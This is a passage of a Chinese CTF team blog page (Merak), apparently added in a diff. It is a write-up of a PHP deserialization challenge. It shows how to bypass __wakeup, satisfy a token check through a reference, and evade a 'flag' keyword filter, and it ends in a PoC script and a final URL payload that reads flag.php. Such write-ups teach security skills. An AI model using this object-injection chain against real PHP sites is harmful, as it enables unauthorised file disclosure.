class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>通过<code>GET</code>获取两个参数：<code>file</code>和<code>payload</code>。<br>Hint.php中有两个类<code>Flag</code>和<code>Handle</code>。主要是通过Handle来调用Flag的getFlag()函数。但在Handle中存在wakeup()函数，该函数会重置所有变量，导致传入的Flag类对象为空。这里可以利用<code>增加对象个数的方式</code>来绕过wakeup函数，增加对象个数时wakeup函数便会失效，这个是比较常见的。还要绕过一层：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+<p>这里我们的<code>$file</code>是<code>flag.php</code>，而初始化后，<code>$this-&gt;token_flag = $this-&gt;token</code>，接着调用getFlag()方法后，重新设置了<code>$this-&gt;token_flag</code>，因此在这里也应该是要使用<code>&amp;</code>符号，令<code>$this-&gt;token_flag = &amp;$this-&gt;token</code>进行浅拷贝。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">         <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+<p>此时还需要绕过<code>?payload=</code>不能出现flag,但是flag在<code>flag.php</code>中，在url多加斜杠即可,<code>///index.php?</code>此时PHP便不会解析成功了。<br>最终PHP的Poc如下:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = &amp;<span class="keyword">$this</span>-&gt;token;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">$o = <span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line">$oo = <span class="keyword">new</span> Handle($o);</span><br><span class="line">$ser = serialize($oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $ser;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终payload:<br><code>///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
+<p>注意Handle有私有变量，应该加上<code>%00</code></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/avatar.png" alt="Merak">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        Merak
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        CTF team
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Beijing</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <a href="/archives">
+                        <p class="title has-text-weight-normal">
+                            9
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <a href="/categories">
+                        <p class="title has-text-weight-normal">
+                            2
+                        </p>
+                    </a>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <a href="/tags">
+                        <p class="title has-text-weight-normal">
+                            5
+                        </p>
+                    </a>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://github.com/BuptMerak" target="_blank" rel="noopener">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="Github" href="https://github.com/BuptMerak">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank" rel="noopener"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            链接
+        </h3>
+        <ul class="menu-list">
+        
+            <li>
+                <a class="level is-mobile" href="https://ieki.xyz" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Eki</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">ieki.xyz</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.duanyufi.com" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Du@nYuFi</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.duanyufi.com</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://blog.csdn.net/crisprx" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Crisprx</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">blog.csdn.net</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.zhaobairen.club" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Retr_0</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.zhaobairen.club</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://me.csdn.net/Zarcs_233" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Rimao</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">me.csdn.net</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://lordriot.live/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">LordRiot</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">lordriot.live</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="http://www.arklight.xyz/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Arklight</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">www.arklight.xyz</span>
+                    </span>
+                </a>
+            </li>
+        
+            <li>
+                <a class="level is-mobile" href="https://myts2.cn/" target="_blank" rel="noopener">
+                    <span class="level-left">
+                        <span class="level-item">Baymax</span>
+                    </span>
+                    <span class="level-right">
+                        <span class="level-item tag">myts2.cn</span>
+                    </span>
+                </a>
+            </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                分类
+            </h3>
+            <ul class="menu-list">
+            <li>
+        <a class="level is-marginless" href="/categories/Pwn/">
+            <span class="level-start">
+                <span class="level-item">Pwn</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">2</span>
+            </span>
+        </a></li><li>
+        <a class="level is-marginless" href="/categories/web/">
+            <span class="level-start">
+                <span class="level-item">web</span>
+            </span>
+            <span class="level-end">
+                <span class="level-item tag">5</span>
+            </span>
+        </a></li>
+            </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            标签云
+        </h3>
+        <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/bypass-canary/" style="font-size: 10px;">bypass canary</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/pop/" style="font-size: 10px;">pop</a> <a href="/tags/rce/" style="font-size: 10px;">rce</a>
+    </div>
+</div>
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen is-sticky">
+        
+            
+        
+            <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2020/10/01/MRCTF2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-10-01T11:43:53.957Z">2020-10-01</time></div>
+                    <a href="/2020/10/01/MRCTF2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/10/01/MRCTF-2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF-2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-10-01T11:43:53.957Z">2020-10-01</time></div>
+                    <a href="/2020/10/01/MRCTF-2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF-2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件上传">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time></div>
+                    <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件上传</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从反序列化、POP链看PHP代码审计">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T10:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从反序列化、POP链看PHP代码审计</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/php-bypass/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/php-bypass/" class="title has-link-black-ter is-size-6 has-text-weight-normal">PHP积累</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ROP/">
+                        <span class="tag">ROP</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/bypass-canary/">
+                        <span class="tag">bypass canary</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/php/">
+                        <span class="tag">php</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pop/">
+                        <span class="tag">pop</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/rce/">
+                        <span class="tag">rce</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right is-sticky">
+    
+        
+    
+        <div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            最新文章
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2020/10/01/MRCTF2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-10-01T11:43:53.957Z">2020-10-01</time></div>
+                    <a href="/2020/10/01/MRCTF2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/10/01/MRCTF-2020/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="MRCTF-2020">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-10-01T11:43:53.957Z">2020-10-01</time></div>
+                    <a href="/2020/10/01/MRCTF-2020/" class="title has-link-black-ter is-size-6 has-text-weight-normal">MRCTF-2020</a>
+                    <p class="is-size-7 is-uppercase">
+                        
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件上传">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T16:01:00.000Z">2020-03-19</time></div>
+                    <a href="/2020/03/19/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件上传</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="从反序列化、POP链看PHP代码审计">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T10:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/pop%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="title has-link-black-ter is-size-6 has-text-weight-normal">从反序列化、POP链看PHP代码审计</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2020/03/18/php-bypass/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="https://live.ieki.xyz/usr/uploads/2020/02/ctf-daily.png" alt="PHP积累">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-18T09:35:21.000Z">2020-03-18</time></div>
+                    <a href="/2020/03/18/php-bypass/" class="title has-link-black-ter is-size-6 has-text-weight-normal">PHP积累</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/web/">web</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            归档
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/10/">
+                <span class="level-start">
+                    <span class="level-item">十月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/03/">
+                <span class="level-start">
+                    <span class="level-item">三月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2020/02/">
+                <span class="level-start">
+                    <span class="level-item">二月 2020</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">2</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                标签
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ROP/">
+                        <span class="tag">ROP</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/bypass-canary/">
+                        <span class="tag">bypass canary</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/php/">
+                        <span class="tag">php</span>
+                        <span class="tag is-grey">3</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/pop/">
+                        <span class="tag">pop</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/rce/">
+                        <span class="tag">rce</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+                
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.png" alt="Merak" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2020 Merak&nbsp;
+				<a href="http://beian.miit.gov.cn/">吉ICP备20000355号-2</a>
+				&nbsp;
+                Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+
+<script>
+var IcarusThemeSettings = {
+    site: {
+        url: 'https://we.buptmerak.cn',
+        external_link: {"enable":true,"exclude":[]}
+    },
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+
+
+<script src="/js/animation.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+
+
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
